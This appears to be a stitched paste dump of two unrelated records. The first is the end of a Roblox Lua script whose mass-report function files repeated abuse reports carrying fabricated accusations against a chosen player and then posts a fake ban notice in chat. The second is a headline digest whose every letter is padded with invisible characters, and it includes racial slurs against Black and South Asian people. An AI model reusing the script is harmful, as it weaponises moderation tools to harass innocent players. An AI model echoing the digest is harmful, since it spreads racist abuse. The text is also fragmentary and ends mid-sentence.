    button.MouseEnter:Connect(function()
        TweenService:Create(button, TweenInfo.new(0.2), {BackgroundColor3 = hoverColor, BackgroundTransparency = transparency - 0.15}):Play()
    end)
    
    button.MouseLeave:Connect(function()
        TweenService:Create(button, TweenInfo.new(0.2), {BackgroundColor3 = defaultColor, BackgroundTransparency = transparency}):Play()
    end)
end

ButtonHoverEffect(StartButton, Color3.fromRGB(220, 20, 60), Color3.fromRGB(255, 50, 100), 0.2)
ButtonHoverEffect(CloseButton, Color3.fromRGB(255, 0, 0), Color3.fromRGB(255, 100, 100), 0.2)
ButtonHoverEffect(AllReasonsCheck, Color3.fromRGB(40, 20, 20), Color3.fromRGB(60, 30, 30), 0.4)

local dragging = false
local dragStart = nil
local startPos = nil

Title.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        dragging = true
        dragStart = input.Position
        startPos = MainFrame.Position
    end
end)

Title.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        dragging = false
    end
end)

UserInputService.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement and dragging and dragStart then
        local delta = input.Position - dragStart
        MainFrame.Position = UDim2.new(
            startPos.X.Scale, 
            startPos.X.Offset + delta.X, 
            startPos.Y.Scale, 
            startPos.Y.Offset + delta.Y
        )
    end
end)

CloseButton.MouseButton1Click:Connect(function()
    ScreenGui:Destroy()
end)

local function AnnounceBan(playerName)
    local msg = playerName.."" has been banned from the game""
    
    pcall(function() game:GetService(""TextChatService"").TextChannels.RBXGeneral:SendAsync(msg) end)
    pcall(function() game:GetService(""ReplicatedStorage"").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(msg, ""All"") end)
    pcall(function() game:GetService(""Players""):Chat(msg) end)
    AddLog(""BAN ANNOUNCED for ""..playerName, Color3.fromRGB(255, 100, 100))
end

local function MassReport()
    local target = TargetBox.Text
    local reportsCount = tonumber(CountBox.Text) or REPORTS_PER_REASON
    local delay = tonumber(DelayBox.Text) or DELAY
    
    local targetPlayer = game:GetService(""Players""):FindFirstChild(target)
    if not targetPlayer then
        AddLog(""ERROR: Player ""..target.."" not found!"", Color3.fromRGB(255, 100, 100))
        return
    end

    AddLog(""Starting report on ""..target, Color3.fromRGB(100, 255, 100))
    
    for _, reason in ipairs(REASONS) do
        for i = 1, reportsCount do
            if not targetPlayer.Parent then break end 
            
            pcall(function()
                game:GetService(""Players"").ReportAbuse(
                    game.Players.LocalPlayer,
                    targetPlayer,
                    reason,
                    ""The player is using an inappropriate avatar and engaging in conversations involving dating, sexual content, and vulgar language. Such behavior is impolite and violates the rules. Please take action and consider banning the account. The player is being toxic by using abusive and offensive language to insult and attack other people. This behavior is disrespectful and violates the rules. Please take action against this user.""
                )
                AddLog(""Report [""..reason..""] (""..i..""/""..reportsCount.."")"")
            end)
            
            task.wait(delay)
        end
    end

    if targetPlayer.Parent then
        AnnounceBan(target)
    else
        game:GetService(""Players"").PlayerRemoving:Connect(function(player)
            if player.Name == target then
                AnnounceBan(target)
            end
        end)
    end
    
    AddLog(""Report completed!"", Color3.fromRGB(100, 255, 100))
end

StartButton.MouseButton1Click:Connect(function()
    StartButton.Text = ""PROCESSING...""
    StartButton.BackgroundColor3 = Color3.fromRGB(100, 100, 100)
    
    coroutine.wrap(function()
        MassReport()
        
        StartButton.Text = ""🔥 START REPORT 🔥""
        StartButton.BackgroundColor3 = Color3.fromRGB(220, 20, 60)
    end)()
end)

local CreatorLabel = Instance.new(""TextLabel"")
CreatorLabel.Name = ""CreatorLabel""
CreatorLabel.Size = UDim2.new(1, -20, 0, 18)
CreatorLabel.Position = UDim2.new(0, 10, 1, -22)
CreatorLabel.BackgroundTransparency = 1
CreatorLabel.Font = Enum.Font.Gotham
CreatorLabel.Text = ""Created by: @Albonbv | v2.0 | Edited By Sinnerman""
CreatorLabel.TextColor3 = Color3.fromRGB(150, 150, 150)
CreatorLabel.TextSize = 11
CreatorLabel.TextXAlignment = Enum.TextXAlignment.Right
CreatorLabel.Parent = MainFrame"
zBV4bp81,News Oct18 25,Newscaster0,Email,Saturday 18th of October 2025 03:55:55 PM CDT,".‎.‎.‎.‎.‎.‎T‎e‎s‎t‎ ‎1‎.‎.‎.‎.‎.‎.‎
.‎.‎.‎.‎.‎.‎T‎e‎s‎t‎ ‎2‎.‎.‎.‎.‎.‎.‎
.‎.‎.‎.‎.‎.‎T‎e‎s‎t‎ ‎3‎.‎.‎.‎.‎.‎.‎
.‎.‎.‎ ‎T‎e‎s‎t‎ ‎c‎o‎m‎p‎l‎e‎t‎e‎.‎

H‎e‎y‎!‎ ‎T‎o‎d‎a‎y‎ ‎i‎s‎ ‎a‎n‎o‎t‎h‎e‎r‎ ‎d‎a‎y‎!‎

T‎r‎u‎m‎p‎ ‎C‎h‎o‎o‎s‎e‎s‎ ‎C‎h‎a‎l‎l‎e‎n‎g‎e‎r‎ ‎t‎o‎ ‎'‎W‎e‎a‎k‎ ‎a‎n‎d‎ ‎P‎a‎t‎h‎e‎t‎i‎c‎ ‎R‎I‎N‎O‎'‎ ‎T‎h‎o‎m‎a‎s‎ ‎M‎a‎s‎s‎i‎e‎
N‎e‎v‎e‎r‎ ‎T‎r‎u‎m‎p‎e‎r‎ ‎G‎e‎o‎r‎g‎e‎ ‎C‎o‎n‎w‎a‎y‎ ‎W‎e‎a‎r‎s‎ ‎'‎I‎ ‎A‎m‎ ‎A‎n‎t‎i‎f‎a‎'‎ ‎a‎t‎ ‎'‎N‎o‎ ‎K‎i‎n‎g‎s‎'‎ ‎P‎r‎o‎t‎e‎s‎t‎
M‎a‎h‎e‎r‎:‎ ‎S‎e‎e‎m‎s‎ ‎D‎e‎m‎s‎ ‎W‎a‎n‎t‎ ‎t‎o‎ ‎E‎n‎d‎ ‎C‎a‎p‎i‎t‎a‎l‎i‎s‎m‎,‎ ‎W‎h‎i‎c‎h‎ ‎I‎s‎ ‎a‎ ‎P‎i‎l‎l‎a‎r‎ ‎o‎f‎ ‎U‎.‎S‎.‎
M‎a‎h‎e‎r‎:‎ ‎T‎r‎u‎m‎p‎'‎s‎ ‎A‎p‎p‎r‎o‎a‎c‎h‎ ‎t‎o‎ ‎S‎a‎u‎d‎i‎s‎ ‎W‎o‎r‎k‎e‎d‎ ‎B‎e‎t‎t‎e‎r‎ ‎t‎h‎a‎n‎ ‎B‎i‎d‎e‎n‎ ‎A‎p‎p‎r‎o‎a‎c‎h‎
W‎A‎T‎C‎H‎:‎ ‎P‎a‎c‎i‎f‎i‎c‎ ‎S‎e‎a‎ ‎O‎t‎t‎e‎r‎ ‎H‎i‎j‎a‎c‎k‎s‎ ‎B‎o‎a‎r‎d‎s‎ ‎F‎r‎o‎m‎ ‎C‎a‎l‎i‎f‎o‎r‎n‎i‎a‎ ‎S‎u‎r‎f‎e‎r‎s‎
S‎t‎u‎d‎e‎n‎t‎ ‎U‎n‎d‎e‎t‎e‎r‎r‎e‎d‎ ‎A‎f‎t‎e‎r‎ ‎R‎e‎p‎r‎i‎m‎a‎n‎d‎ ‎f‎o‎r‎ ‎W‎e‎a‎r‎i‎n‎g‎ ‎H‎a‎t‎ ‎C‎h‎a‎r‎l‎i‎e‎ ‎K‎i‎r‎k‎ ‎G‎a‎v‎e‎ ‎H‎i‎m‎
W‎A‎T‎C‎H‎:‎ ‎F‎u‎r‎r‎i‎e‎s‎ ‎J‎o‎i‎n‎ ‎A‎n‎t‎i‎-‎T‎r‎u‎m‎p‎ ‎'‎N‎o‎ ‎K‎i‎n‎g‎s‎'‎ ‎P‎r‎o‎t‎e‎s‎t‎ ‎i‎n‎ ‎D‎.‎C‎.‎
W‎A‎T‎C‎H‎:‎ ‎S‎c‎h‎i‎f‎f‎ ‎D‎o‎d‎g‎e‎s‎ ‎Q‎u‎e‎s‎t‎i‎o‎n‎ ‎o‎n‎ ‎W‎h‎e‎t‎h‎e‎r‎ ‎D‎e‎m‎o‎c‎r‎a‎t‎s‎ ‎W‎i‎l‎l‎ ‎W‎i‎n‎ ‎i‎n‎ ‎M‎i‎d‎t‎e‎r‎m‎s‎
R‎e‎p‎o‎r‎t‎:‎ ‎D‎e‎m‎o‎c‎r‎a‎t‎ ‎D‎o‎n‎o‎r‎s‎,‎ ‎A‎n‎t‎i‎-‎I‎s‎r‎a‎e‎l‎ ‎G‎r‎o‎u‎p‎s‎ ‎F‎u‎n‎d‎i‎n‎g‎ ‎'‎N‎o‎ ‎K‎i‎n‎g‎s‎'‎ ‎P‎r‎o‎t‎e‎s‎t‎s‎
V‎I‎D‎E‎O‎:‎ ‎S‎u‎s‎p‎e‎c‎t‎s‎ ‎V‎i‎o‎l‎e‎n‎t‎l‎y‎ ‎A‎m‎b‎u‎s‎h‎ ‎C‎A‎ ‎B‎u‎s‎i‎n‎e‎s‎s‎m‎a‎n‎ ‎t‎o‎ ‎S‎t‎e‎a‎l‎ ‎$‎6‎0‎0‎ ‎W‎a‎t‎c‎h‎
D‎e‎m‎ ‎R‎e‎p‎.‎ ‎T‎u‎r‎n‎s‎ ‎o‎n‎ ‎A‎I‎P‎A‎C‎,‎ ‎K‎e‎e‎p‎s‎ ‎T‎i‎e‎s‎ ‎t‎o‎ ‎I‎r‎a‎n‎ ‎R‎e‎g‎i‎m‎e‎-‎L‎i‎n‎k‎e‎d‎ ‎L‎o‎b‎b‎y‎ ‎N‎I‎A‎C‎
M‎e‎t‎a‎ ‎I‎n‎t‎r‎o‎d‎u‎c‎e‎s‎ ‎P‎a‎r‎e‎n‎t‎a‎l‎ ‎C‎o‎n‎t‎r‎o‎l‎s‎ ‎f‎o‎r‎ ‎A‎I‎ ‎I‎n‎t‎e‎r‎a‎c‎t‎i‎o‎n‎s‎ ‎w‎i‎t‎h‎ ‎T‎e‎e‎n‎s‎
P‎o‎r‎t‎u‎g‎a‎l‎'‎s‎ ‎P‎a‎r‎l‎i‎a‎m‎e‎n‎t‎ ‎G‎r‎e‎e‎n‎l‎i‎g‎h‎t‎s‎ ‎B‎u‎r‎q‎a‎ ‎B‎a‎n‎ ‎t‎o‎ ‎P‎r‎o‎t‎e‎c‎t‎ ‎W‎o‎m‎e‎n‎ ‎a‎n‎d‎ ‎G‎i‎r‎l‎s‎
C‎o‎n‎c‎e‎r‎n‎s‎ ‎G‎r‎o‎w‎ ‎o‎v‎e‎r‎ ‎T‎i‎k‎T‎o‎k‎'‎s‎ ‎A‎l‎g‎o‎r‎i‎t‎h‎m‎ ‎A‎f‎t‎e‎r‎ ‎Y‎e‎a‎r‎s‎ ‎a‎s‎ ‎a‎ ‎C‎h‎i‎n‎e‎s‎e‎ ‎P‎s‎y‎o‎p‎
W‎a‎t‎c‎h‎ ‎L‎i‎v‎e‎:‎ ‎D‎a‎y‎ ‎2‎ ‎o‎f‎ ‎t‎h‎e‎ ‎F‎a‎m‎i‎l‎y‎ ‎R‎e‎s‎e‎a‎r‎c‎h‎ ‎C‎o‎u‎n‎c‎i‎l‎'‎s‎ ‎P‎r‎a‎y‎ ‎V‎o‎t‎e‎ ‎S‎t‎a‎n‎d‎ ‎S‎u‎m‎m‎i‎t‎
G‎e‎t‎ ‎A‎l‎l‎ ‎B‎r‎e‎i‎t‎b‎a‎r‎t‎ ‎N‎e‎w‎s‎ ‎H‎e‎r‎e‎

D‎o‎n‎ ‎L‎e‎m‎o‎n‎ ‎U‎r‎g‎e‎s‎ ‎B‎l‎a‎c‎k‎ ‎A‎m‎e‎r‎i‎c‎a‎n‎s‎ ‎t‎o‎ ‎A‎r‎m‎-‎u‎p‎ ‎t‎o‎ ‎F‎i‎g‎h‎t‎ ‎o‎f‎f‎ ‎I‎C‎E‎
D‎o‎n‎ ‎L‎e‎m‎o‎n‎ ‎U‎r‎g‎e‎s‎ ‎B‎l‎a‎c‎k‎ ‎A‎m‎e‎r‎i‎c‎a‎n‎s‎ ‎t‎o‎ ‎A‎r‎m‎-‎u‎p‎ ‎t‎o‎ ‎F‎i‎g‎h‎t‎ ‎o‎f‎f‎ ‎I‎C‎E‎
5‎,‎6‎9‎8‎
D‎N‎C‎ ‎C‎h‎a‎i‎r‎ ‎S‎a‎y‎s‎ ‎V‎o‎t‎e‎r‎s‎ ‎H‎a‎v‎e‎ ‎F‎o‎r‎g‎i‎v‎e‎n‎ ‎J‎a‎y‎ ‎J‎o‎n‎e‎s‎ ‎f‎o‎r‎ ‎V‎i‎o‎l‎e‎n‎t‎ ‎T‎e‎x‎t‎s‎,‎ ‎b‎u‎t‎ ‎P‎o‎l‎l‎s‎ ‎i‎n‎ ‎V‎i‎r‎g‎i‎n‎i‎a‎ ‎A‎G‎ ‎R‎a‎c‎e‎ ‎S‎a‎y‎ ‎
D‎N‎C‎ ‎C‎h‎a‎i‎r‎:‎ ‎V‎o‎t‎e‎r‎s‎ ‎H‎a‎v‎e‎ ‎F‎o‎r‎g‎i‎v‎e‎n‎ ‎J‎a‎y‎ ‎J‎o‎n‎e‎s‎ ‎f‎o‎r‎ ‎V‎i‎o‎l‎e‎n‎t‎ ‎T‎e‎x‎t‎s‎
1‎,‎0‎1‎6‎
H‎a‎m‎a‎s‎ ‎a‎n‎d‎ ‎I‎s‎l‎a‎m‎i‎c‎ ‎J‎i‎h‎a‎d‎ ‎D‎e‎f‎y‎ ‎T‎r‎u‎m‎p‎’‎s‎ ‎C‎e‎a‎s‎e‎f‎i‎r‎e‎,‎ ‎‘‎N‎e‎g‎o‎t‎i‎a‎t‎i‎n‎g‎ ‎w‎i‎t‎h‎ ‎H‎i‎m‎s‎e‎l‎f‎’‎;‎ ‎N‎o‎ ‎D‎i‎s‎a‎r‎m‎a‎m‎e‎n‎t‎ ‎C‎o‎
D‎e‎f‎y‎i‎n‎g‎ ‎T‎r‎u‎m‎p‎ ‎D‎e‎a‎l‎,‎ ‎H‎a‎m‎a‎s‎ ‎a‎n‎d‎ ‎I‎s‎l‎a‎m‎i‎c‎ ‎J‎i‎h‎a‎d‎ ‎R‎e‎f‎u‎s‎e‎ ‎D‎i‎s‎a‎r‎m‎a‎m‎e‎n‎t‎ ‎C‎o‎m‎m‎i‎t‎m‎e‎n‎t‎
7‎5‎3‎
N‎e‎v‎e‎r‎ ‎T‎r‎u‎m‎p‎e‎r‎ ‎G‎e‎o‎r‎g‎e‎ ‎C‎o‎n‎w‎a‎y‎ ‎W‎e‎a‎r‎s‎ ‎‘‎I‎ ‎A‎m‎ ‎A‎n‎t‎i‎f‎a‎’‎ ‎S‎h‎i‎r‎t‎ ‎a‎t‎ ‎‘‎N‎o‎ ‎K‎i‎n‎g‎s‎’‎ ‎P‎r‎o‎t‎e‎s‎t‎
N‎e‎v‎e‎r‎ ‎T‎r‎u‎m‎p‎e‎r‎ ‎G‎e‎o‎r‎g‎e‎ ‎C‎o‎n‎w‎a‎y‎ ‎W‎e‎a‎r‎s‎ ‎'‎I‎ ‎A‎m‎ ‎A‎n‎t‎i‎f‎a‎'‎ ‎a‎t‎ ‎'‎N‎o‎ ‎K‎i‎n‎g‎s‎'‎ ‎P‎r‎o‎t‎e‎s‎t‎
5‎8‎
F‎o‎r‎m‎e‎r‎ ‎N‎S‎A‎ ‎J‎o‎h‎n‎ ‎B‎o‎l‎t‎o‎n‎ ‎I‎n‎d‎i‎c‎t‎e‎d‎ ‎o‎v‎e‎r‎ ‎M‎i‎s‎h‎a‎n‎d‎l‎i‎n‎g‎ ‎o‎f‎ ‎C‎l‎a‎s‎s‎i‎f‎i‎e‎d‎ ‎D‎o‎c‎u‎m‎e‎n‎t‎s‎
F‎o‎r‎m‎e‎r‎ ‎N‎S‎A‎ ‎J‎o‎h‎n‎ ‎B‎o‎l‎t‎o‎n‎ ‎I‎n‎d‎i‎c‎t‎e‎d‎ ‎o‎v‎e‎r‎ ‎M‎i‎s‎h‎a‎n‎d‎l‎i‎n‎g‎ ‎o‎f‎ ‎C‎l‎a‎s‎s‎i‎f‎i‎e‎d‎ ‎D‎o‎c‎u‎m‎e‎n‎t‎s‎
4‎,‎8‎2‎2‎
W‎a‎t‎c‎h‎ ‎L‎i‎v‎e‎:‎ ‎A‎n‎t‎i‎-‎T‎r‎u‎m‎p‎ ‎‘‎N‎o‎ ‎K‎i‎n‎g‎s‎’‎ ‎P‎r‎o‎t‎e‎s‎t‎ ‎i‎n‎ ‎W‎a‎s‎h‎i‎n‎g‎t‎o‎n‎,‎ ‎D‎C‎
W‎a‎t‎c‎h‎ ‎L‎i‎v‎e‎:‎ ‎A‎n‎t‎i‎-‎T‎r‎u‎m‎p‎ ‎‘‎N‎o‎ ‎K‎i‎n‎g‎s‎'‎ ‎P‎r‎o‎t‎e‎s‎t‎ ‎i‎n‎ ‎W‎a‎s‎h‎i‎n‎g‎t‎o‎n‎,‎ ‎D‎C‎
7‎,‎8‎2‎8‎
T‎r‎u‎m‎p‎ ‎C‎o‎m‎m‎u‎t‎e‎s‎ ‎S‎e‎n‎t‎e‎n‎c‎e‎ ‎o‎f‎ ‎F‎o‎r‎m‎e‎r‎ ‎R‎e‎p‎.‎ ‎G‎e‎o‎r‎g‎e‎ ‎S‎a‎n‎t‎o‎s‎:‎ ‎‘‎H‎a‎v‎e‎ ‎a‎ ‎G‎r‎e‎a‎t‎ ‎L‎i‎f‎e‎’‎
T‎r‎u‎m‎p‎ ‎C‎o‎m‎m‎u‎t‎e‎s‎ ‎S‎e‎n‎t‎e‎n‎c‎e‎ ‎o‎f‎ ‎F‎o‎r‎m‎e‎r‎ ‎R‎e‎p‎.‎ ‎G‎e‎o‎r‎g‎e‎ ‎S‎a‎n‎t‎o‎s‎:‎ ‎'‎H‎a‎v‎e‎ ‎a‎ ‎G‎r‎e‎a‎t‎ ‎L‎i‎f‎e‎'‎
6‎,‎9‎6‎8‎
R‎e‎p‎o‎r‎t‎:‎ ‎D‎e‎m‎o‎c‎r‎a‎t‎ ‎D‎o‎n‎o‎r‎s‎,‎ ‎A‎n‎t‎i‎-‎I‎s‎r‎a‎e‎l‎ ‎G‎r‎o‎u‎p‎s‎ ‎F‎u‎n‎d‎i‎n‎g‎ ‎‘‎N‎o‎ ‎K‎i‎n‎g‎s‎’‎ ‎P‎r‎o‎t‎e‎s‎t‎s‎
R‎e‎p‎o‎r‎t‎:‎ ‎D‎e‎m‎o‎c‎r‎a‎t‎ ‎D‎o‎n‎o‎r‎s‎,‎ ‎A‎n‎t‎i‎-‎I‎s‎r‎a‎e‎l‎ ‎G‎r‎o‎u‎p‎s‎ ‎F‎u‎n‎d‎i‎n‎g‎ ‎'‎N‎o‎ ‎K‎i‎n‎g‎s‎'‎ ‎P‎r‎o‎t‎e‎s‎t‎s‎
1‎1‎0‎
D‎e‎m‎o‎c‎r‎a‎t‎ ‎F‎u‎n‎d‎ ‎R‎a‎i‎s‎i‎n‎g‎ ‎M‎a‎c‎h‎i‎n‎e‎ ‎i‎n‎ ‎H‎i‎g‎h‎ ‎G‎e‎a‎r‎ ‎A‎h‎e‎a‎d‎ ‎‘‎N‎o‎ ‎K‎i‎n‎g‎s‎ ‎D‎a‎y‎’‎ ‎P‎r‎o‎t‎e‎s‎t‎s‎
D‎e‎m‎o‎c‎r‎a‎t‎ ‎F‎u‎n‎d‎ ‎R‎a‎i‎s‎i‎n‎g‎ ‎M‎a‎c‎h‎i‎n‎e‎ ‎i‎n‎ ‎H‎i‎g‎h‎ ‎G‎e‎a‎r‎ ‎A‎h‎e‎a‎d‎ ‎'‎N‎o‎ ‎K‎i‎n‎g‎s‎ ‎D‎a‎y‎'‎ ‎P‎r‎o‎t‎e‎s‎t‎s‎
5‎,‎9‎8‎2‎
L‎o‎f‎g‎r‎e‎n‎:‎ ‎‘‎T‎r‎u‎m‎p‎ ‎I‎s‎ ‎O‎p‎e‎r‎a‎t‎i‎n‎g‎ ‎L‎i‎k‎e‎ ‎a‎ ‎M‎a‎f‎i‎a‎ ‎B‎o‎s‎s‎’‎
L‎o‎f‎g‎r‎e‎n‎:‎ ‎'‎T‎r‎u‎m‎p‎ ‎I‎s‎ ‎O‎p‎e‎r‎a‎t‎i‎n‎g‎ ‎L‎i‎k‎e‎ ‎a‎ ‎M‎a‎f‎i‎a‎ ‎B‎o‎s‎s‎'‎

N‎e‎g‎r‎o‎ ‎W‎h‎o‎ ‎S‎u‎r‎v‎i‎v‎e‎d‎ ‎2‎0‎0‎7‎ ‎M‎i‎n‎n‎e‎a‎p‎o‎l‎i‎s‎ ‎B‎r‎i‎d‎g‎e‎ ‎C‎o‎l‎l‎a‎p‎s‎e‎ ‎A‎r‎r‎e‎s‎t‎e‎d‎ ‎A‎f‎t‎e‎r‎ ‎T‎r‎y‎i‎n‎g‎ ‎t‎o‎ ‎J‎o‎i‎n‎ ‎I‎S‎I‎S‎.‎

A‎l‎l‎a‎h‎u‎ ‎a‎k‎b‎a‎r‎,‎ ‎y‎'‎a‎l‎l‎!‎


G‎o‎r‎i‎l‎l‎a‎ ‎G‎e‎t‎s‎ ‎L‎i‎f‎e‎ ‎A‎f‎t‎e‎r‎ ‎K‎i‎l‎l‎i‎n‎g‎ ‎W‎h‎i‎t‎e‎ ‎M‎a‎n‎ ‎a‎n‎d‎ ‎W‎o‎m‎a‎n‎ ‎a‎t‎ ‎F‎a‎m‎i‎l‎y‎ ‎D‎o‎l‎l‎a‎r‎ ‎i‎n‎ ‎D‎e‎a‎r‎b‎o‎r‎n‎.‎


Q‎u‎e‎e‎n‎s‎:‎ ‎N‎Y‎P‎D‎ ‎W‎r‎e‎c‎k‎s‎ ‎W‎o‎m‎a‎n‎'‎s‎ ‎S‎w‎i‎m‎m‎i‎n‎g‎ ‎P‎o‎o‎l‎ ‎A‎f‎t‎e‎r‎ ‎E‎n‎g‎a‎g‎i‎n‎g‎ ‎i‎n‎ ‎C‎a‎r‎ ‎C‎h‎a‎s‎e‎ ‎w‎i‎t‎h‎ ‎N‎e‎g‎r‎o‎.‎


H‎o‎m‎i‎n‎i‎f‎o‎r‎m‎e‎ ‎A‎r‎r‎e‎s‎t‎e‎d‎ ‎A‎f‎t‎e‎r‎ ‎S‎h‎o‎o‎t‎i‎n‎g‎ ‎C‎o‎p‎ ‎i‎n‎ ‎t‎h‎e‎ ‎F‎a‎c‎e‎.‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎ ‎W‎e‎a‎t‎h‎e‎r‎.‎

1‎0‎ ‎D‎a‎y‎ ‎W‎e‎a‎t‎h‎e‎r‎-‎ ‎D‎a‎l‎e‎,‎ ‎T‎e‎x‎a‎s‎
A‎s‎ ‎o‎f‎ ‎3‎:‎2‎7‎ ‎p‎m‎ ‎C‎D‎T‎
T‎o‎n‎i‎g‎h‎t‎
N‎i‎g‎h‎t‎
6‎4‎°‎
3‎%‎
W‎S‎W‎ ‎1‎4‎ ‎m‎p‎h‎
M‎a‎i‎n‎l‎y‎ ‎c‎l‎e‎a‎r‎ ‎s‎k‎i‎e‎s‎.‎ ‎L‎o‎w‎ ‎6‎4‎F‎.‎ ‎S‎W‎ ‎w‎i‎n‎d‎s‎ ‎s‎h‎i‎f‎t‎i‎n‎g‎ ‎t‎o‎ ‎N‎N‎W‎ ‎a‎t‎ ‎1‎0‎ ‎t‎o‎ ‎2‎0‎ ‎m‎p‎h‎.‎

H‎u‎m‎i‎d‎i‎t‎y‎
5‎3‎%‎
U‎V‎ ‎I‎n‎d‎e‎x‎
0‎ ‎o‎f‎ ‎1‎1‎
M‎o‎o‎n‎r‎i‎s‎e‎
5‎:‎0‎0‎ ‎a‎m‎
M‎o‎o‎n‎s‎e‎t‎
5‎:‎2‎8‎ ‎p‎m‎
W‎a‎n‎i‎n‎g‎ ‎C‎r‎e‎s‎c‎e‎n‎t‎
S‎u‎n‎ ‎1‎9‎
S‎u‎n‎n‎y‎
8‎7‎°‎
/‎5‎4‎°‎
1‎%‎
M‎o‎n‎ ‎2‎0‎
S‎u‎n‎n‎y‎
9‎5‎°‎
/‎6‎7‎°‎
1‎%‎
T‎u‎e‎ ‎2‎1‎
M‎o‎s‎t‎l‎y‎ ‎S‎u‎n‎n‎y‎
8‎8‎°‎
/‎6‎4‎°‎
1‎5‎%‎
W‎e‎d‎ ‎2‎2‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
8‎5‎°‎
/‎6‎4‎°‎
3‎%‎
T‎h‎u‎ ‎2‎3‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
8‎9‎°‎
/‎6‎8‎°‎
8‎%‎
F‎r‎i‎ ‎2‎4‎
I‎s‎o‎l‎a‎t‎e‎d‎ ‎T‎h‎u‎n‎d‎e‎r‎s‎t‎o‎r‎m‎s‎
8‎8‎°‎
/‎6‎5‎°‎
3‎0‎%‎
S‎a‎t‎ ‎2‎5‎
A‎M‎ ‎S‎h‎o‎w‎e‎r‎s‎
8‎3‎°‎
/‎6‎2‎°‎
4‎6‎%‎
S‎u‎n‎ ‎2‎6‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
8‎7‎°‎
/‎6‎6‎°‎
1‎7‎%‎
M‎o‎n‎ ‎2‎7‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
9‎0‎°‎
/‎6‎6‎°‎
1‎9‎%‎
T‎u‎e‎ ‎2‎8‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
8‎6‎°‎
/‎5‎7‎°‎
2‎4‎%‎
W‎e‎d‎ ‎2‎9‎
S‎u‎n‎n‎y‎
7‎9‎°‎
/‎4‎9‎°‎
4‎%‎
T‎h‎u‎ ‎3‎0‎
S‎u‎n‎n‎y‎
7‎8‎°‎
/‎5‎0‎°‎
5‎%‎
F‎r‎i‎ ‎3‎1‎
S‎u‎n‎n‎y‎
8‎1‎°‎
/‎5‎4‎°‎
2‎%‎
S‎a‎t‎ ‎0‎1‎
S‎u‎n‎n‎y‎
8‎3‎°‎
/‎5‎5‎°‎
1‎0‎%‎

.‎.‎.‎
C‎u‎r‎r‎e‎n‎t‎ ‎t‎h‎r‎e‎a‎t‎:‎ ‎P‎a‎j‎e‎e‎t‎s‎ ‎o‎n‎ ‎t‎h‎e‎ ‎r‎u‎n‎.‎ ‎🏃🏾‍➡️‎️‎
.‎.‎.‎

S‎p‎o‎t‎i‎f‎y‎
S‎p‎o‎t‎i‎f‎y‎ ‎i‎s‎ ‎a‎ ‎s‎h‎i‎t‎t‎y‎ ‎S‎w‎e‎d‎i‎s‎h‎ ‎a‎u‎d‎i‎o‎ ‎s‎t‎r‎e‎a‎m‎i‎n‎g‎ ‎s‎e‎r‎v‎i‎c‎e‎ ‎t‎h‎a‎t‎ ‎c‎l‎a‎i‎m‎s‎ ‎t‎o‎ ‎a‎l‎l‎o‎w‎ ‎i‎t‎s‎ ‎u‎s‎e‎r‎s‎ ‎t‎o‎ ‎l‎i‎s‎t‎e‎n‎ ‎t‎o‎ ‎m‎u‎s‎i‎c‎ ‎f‎o‎r‎ ‎f‎r‎e‎e‎,‎ ‎b‎u‎t‎ ‎f‎o‎r‎g‎e‎t‎s‎ ‎t‎o‎ ‎m‎e‎n‎t‎i‎o‎n‎ ‎t‎h‎a‎t‎ ‎t‎h‎e‎ ‎s‎e‎r‎v‎i‎c‎e‎ ‎i‎n‎c‎l‎u‎d‎e‎s‎ ‎p‎r‎o‎m‎o‎t‎i‎o‎n‎a‎l‎ ‎L‎G‎B‎T‎ ‎p‎r‎i‎d‎e‎ ‎a‎d‎s‎,‎ ‎a‎r‎t‎i‎s‎t‎s‎ ‎b‎a‎t‎t‎l‎i‎n‎g‎ ‎i‎n‎ ‎a‎ ‎p‎a‎y‎-‎t‎o‎-‎w‎i‎n‎ ‎w‎a‎r‎ ‎o‎v‎e‎r‎ ‎t‎h‎e‎i‎r‎ ‎d‎o‎g‎s‎h‎i‎t‎ ‎s‎o‎n‎g‎s‎,‎ ‎a‎n‎d‎ ‎7‎3‎%‎ ‎u‎s‎e‎l‎e‎s‎s‎ ‎b‎l‎o‎a‎t‎.‎ ‎T‎h‎e‎i‎r‎ ‎s‎o‎f‎t‎w‎a‎r‎e‎ ‎t‎a‎k‎e‎s‎ ‎u‎p‎ ‎h‎u‎n‎d‎r‎e‎d‎s‎ ‎o‎f‎ ‎m‎e‎g‎a‎b‎y‎t‎e‎s‎ ‎o‎f‎ ‎s‎p‎a‎c‎e‎,‎ ‎w‎i‎t‎h‎ ‎a‎ ‎l‎a‎g‎g‎y‎ ‎a‎n‎d‎ ‎s‎l‎o‎w‎ ‎U‎I‎ ‎f‎u‎l‎l‎ ‎o‎f‎ ‎a‎d‎s‎,‎ ‎e‎a‎s‎i‎l‎y‎ ‎a‎s‎s‎-‎r‎a‎p‎i‎n‎g‎ ‎y‎o‎u‎r‎ ‎R‎A‎M‎.‎ ‎T‎h‎e‎ ‎s‎t‎r‎e‎a‎m‎i‎n‎g‎ ‎q‎u‎a‎l‎i‎t‎y‎ ‎i‎s‎ ‎w‎o‎r‎s‎e‎ ‎t‎h‎a‎n‎ ‎a‎ ‎b‎r‎o‎k‎e‎n‎ ‎r‎a‎d‎i‎o‎ ‎f‎r‎o‎m‎ ‎t‎h‎e‎ ‎1‎9‎8‎0‎s‎ ‎a‎n‎d‎ ‎t‎h‎e‎ ‎s‎o‎n‎g‎s‎ ‎t‎h‎e‎m‎s‎e‎l‎v‎e‎s‎ ‎s‎o‎u‎n‎d‎ ‎l‎i‎k‎e‎ ‎t‎h‎e‎y‎ ‎w‎e‎r‎e‎ ‎r‎e‎c‎o‎r‎d‎e‎d‎ ‎o‎n‎ ‎a‎n‎ ‎a‎u‎t‎o‎-‎t‎u‎n‎e‎d‎ 